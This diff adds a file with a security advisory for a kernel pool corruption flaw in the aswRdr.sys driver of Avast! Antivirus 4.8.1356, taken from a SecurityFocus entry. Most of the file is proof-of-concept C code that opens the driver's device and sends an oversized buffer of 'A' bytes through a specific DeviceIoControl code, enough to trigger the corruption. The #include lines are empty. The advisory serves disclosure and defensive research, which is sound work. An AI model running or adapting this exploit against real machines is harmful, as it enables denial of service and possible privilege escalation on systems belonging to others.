@@ -1,0 +1,88 @@
+source: http://www.securityfocus.com/bid/37031/info
+
+Avast! Antivirus is prone to a local privilege-escalation vulnerability.
+
+Local attackers can exploit this issue to execute arbitrary code with superuser privileges and completely compromise the affected computer. Failed exploit attempts will result in a denial-of-service condition.
+
+Avast! Antivirus 4.8.1356 is vulnerable; other versions may also be affected.
+
+/* Avast 4.8.1356.0 antivirus aswRdr.sys Kernel Pool Corruption
+*
+* Author(s): Giuseppe 'Evilcry' Bonfa'
+*            AbdulAziz Hariri
+* E-Mail: evilcry _AT_ gmail _DOT_ com
+* Website: http://evilcry.netsons.org
+*          http://evilcodecave.blogspot.com
+*          http://evilcodecave.wordpress.com
+*     http://evilfingers.com
+*
+*  Disclosure Timeline: As specified in the Advisory.
+*/
+
+#define WIN32_LEAN_AND_MEAN
+#include
+#include
+
+
+BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice) //taken from esagelab
+{
+ WCHAR DeviceName[MAX_PATH];
+ HANDLE hDevice;
+
+ if ((GetVersion() & 0xFF) >= 5)
+ {
+  wcscpy(DeviceName, L"\\\\.\\Global\\");
+ }
+ else
+ {
+  wcscpy(DeviceName, L"\\\\.\\");
+ }
+
+ wcscat(DeviceName, DriverName);
+
+ printf("Opening.. %S\n", DeviceName);
+
+ hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0,
+NULL, OPEN_EXISTING,
+  FILE_ATTRIBUTE_NORMAL, NULL);
+
+ if (hDevice == INVALID_HANDLE_VALUE)
+ {
+  printf("CreateFile() ERROR %d\n", GetLastError());
+  return FALSE;
+ }
+
+ *lphDevice = hDevice;
+
+ return TRUE;
+}
+
+int main()
+{
+ HANDLE hDev = NULL;
+ DWORD Junk;
+
+ if(!OpenDevice(L"aswRDR",&hDev))
+ {
+  printf("Unable to access aswMon");
+  return(0);
+ }
+
+ char *Buff = (char *)VirtualAlloc(NULL, 0x156, MEM_RESERVE |
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+ if (Buff)
+ {
+  memset(Buff, 'A', 0x156);
+
+DeviceIoControl(hDev,0x80002024,Buff,0x156,Buff,0x156,&Junk,(LPOVERLAPPED)NULL);
+  printf("DeviceIoControl Executed..\n");
+ }
+ else
+ {
+  printf("VirtualAlloc() ERROR %d\n", GetLastError());
+ }
+
+
+ return(0);
+}
